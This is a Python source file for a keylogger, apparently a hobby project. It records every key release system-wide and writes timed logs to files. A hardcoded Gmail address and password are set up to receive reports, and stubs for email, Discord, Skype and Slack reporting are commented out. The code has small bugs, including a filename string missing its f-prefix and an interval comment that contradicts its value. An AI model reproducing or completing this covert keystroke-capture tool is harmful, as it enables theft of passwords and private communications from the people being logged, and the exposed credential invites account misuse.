import email # Imported to handle email addresses
import keyboard # Imported to provide the ability to log keys
import smtplib # Imported to provide the ability to send the recorded key logs though SMTP protocol for email

from threading import Timer # Intended to make it possible to send reports have a set period of time
from datetime import datetime

# Email Variables for report type of emails
EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
EMAIL_PW = "Keylogger77!!" # Password for Email

#Time Interval Variable
LOG_INTERVAL = 20 # Every 300 Seconds (5 minutes) a report is sent

class UsbKeylogger:
    def __init__(self, reportInterval, reportType):
        self.reportInterval = reportInterval
        self.reportType = reportType
        self.startTimeVal = datetime.now() # Used to document the start datetime
        self.endTimeVal = datetime.now() # Used to document the end datetime
        self.keylog = "" # Creates a global string variable named keylog to store the keylogs, which will only store keylogs of the set report interval.

    def createFileIdentifier(self):
        startTime = str(self.startTimeVal) # Creates a string variable from the start time of the keylog interval
        endTime = str(self.endTimeVal) # Creates a string variable from the end time of the keylog interval
        self.fileIndentifier = f"Log: {startTime} to {endTime}" # Sets the file name to "Log start time to end time"

    def reportFile(self):
        fileIdentifierStr = "{self.fileIndentifier}.txt" # Creates a string variable from the file identifier variable
        with open(f"{fileIdentifierStr}", "w") as f: # Opens a file of the name from createFileIdentifier
            print(self.keylog, file = f) # Print the contents of a variable (self.keylog) to a file

    #def reportEmail(self):
    #def reportDiscord(self):
    #def reportSkype(self):
    #def reportSlack(self):

    def callbackKeyboard(self, event):
        eventName = event.name # Create eventName variable
        nameLength = len(eventName) # Returns the length of the eventName variable
        if nameLength > 1: # Conditional statement to format the appearence of the keylogs in event that they key is not a typical character like a letter or number. 
            if eventName == "tab":
                eventName = "[TAB]\t" # Replaces [TAB] with [TAB] and a tab space afterward    
            elif eventName == "enter":
                eventName = "[ENTER]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
            elif eventName == "space":
                eventName = " " # Replaces [SPACE] with " " for readability
            elif eventName == "decimal":
                eventName = "." # Replaces [DECIMAL] with "." for readability
        self.keylog = self.keylog + eventName

    def reportKeyLog(self):
        if self.keylog:
            self.endTimeVal = datetime.now()
            self.createFileIdentifier()
            if self.reportType == "File":
                self.reportFile()
            self.startTimeVal = datetime.now()
        self.keylog = ""
        logTimer = Timer(interval = self.reportInterval, function = self.reportKeyLog)
        logTimer.daemon = True
        logTimer.start()

    def start(self):
        self.startTimeVal = datetime.now()
        keyboard.on_release(callback = self.callbackKeyboard)
        self.reportKeyLog()
        keyboard.wait()

if __name__ == "__main__":
        usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
        usbKeylogger.start()
    